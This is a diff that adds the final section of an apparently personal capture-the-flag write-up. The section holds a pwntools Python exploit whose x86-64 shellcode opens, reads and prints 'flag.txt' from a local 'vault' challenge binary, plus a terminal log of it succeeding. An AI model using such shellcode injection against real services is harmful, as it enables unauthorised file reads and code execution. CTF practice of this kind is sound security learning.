@@ -154,4 +154,66 @@ int main(void) {
 }
 ```
 
-****
+**Exploit writing..**
+
+```
+from pwn import *
+
+context.arch = "amd64"
+
+sc = asm("""
+    lea rdi, [rip+p]      # rdi = pointer to "flag.txt" (rip-relative)
+    xor esi, esi          # esi = 0  (O_RDONLY)
+    xor edx, edx          # edx = 0  (mode, unused for open)
+    mov eax, 2            # syscall 2 = open
+    syscall               # open("flag.txt", O_RDONLY) -> fd in eax
+
+    mov edi, eax          # edi = fd
+    sub rsp, 0x100        # carve 0x100 bytes on stack for the read buffer
+    mov rsi, rsp          # rsi = buffer
+    mov edx, 0x100        # edx = 0x100 bytes to read
+    xor eax, eax          # syscall 0 = read
+    syscall               # read(fd, buf, 0x100) -> n in eax
+
+    mov edx, eax          # edx = n (bytes actually read)
+    mov edi, 1            # edi = 1 (stdout)
+    mov rsi, rsp          # rsi = buffer
+    mov eax, 1            # syscall 1 = write
+    syscall               # write(1, buf, n) -> prints flag
+
+    mov eax, 60           # syscall 60 = exit
+    xor edi, edi          # exit code 0
+    syscall               # exit(0)
+
+p:
+    .asciz "flag.txt"     # string; RIP-relative label for lea
+""")
+
+io = process(["./ld-linux-x86-64.so.2",
+              "--library-path",
+              ".",
+              "./vault"])
+
+io.recvuntil(b"EOF:")
+io.send(sc)
+io.shutdown("send")
+
+print(io.recvall().decode())
+```
+
+**exploit run**
+
+```
+skid@TheGreen:~/ctfs/new$ ls
+e.py  flag.txt  ld-linux-x86-64.so.2  libc.so.6  README.txt  vault  vault.ghidra-out  vault.zip
+skid@TheGreen:~/ctfs/new$ python3 e.py
+[+] Starting local process './ld-linux-x86-64.so.2': pid 2882
+[+] Receiving all data: Done (19B)
+[*] Process './ld-linux-x86-64.so.2' stopped with exit code 0 (pid 2882)
+
+fah{congrutalion}
+
+skid@TheGreen:~/ctfs/new$
+```
+
+**Try it yourself binary is there its self explaned..**
